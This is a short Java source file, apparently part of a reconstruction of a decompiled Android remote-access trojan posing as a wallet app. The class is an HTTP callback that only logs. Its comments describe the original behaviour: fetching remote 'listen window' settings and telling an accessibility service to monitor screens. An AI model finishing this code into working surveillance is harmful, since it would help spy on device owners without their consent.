package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.m (ListenWindowCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * ListenWindowCallback - 监听窗口配置回调
 * vendor: 解析 ApiResult<List<ListenWindow>>，保存到 listenWindows.json，通知无障碍服务刷新
 */
public final class m implements Callback {

    private static final String TAG = "ListenWindowCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<List<ListenWindow>>, saves listenWindows.json,
            // logs "远程监听窗口已触达", notifies MyAccessibilityService.F(1)
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
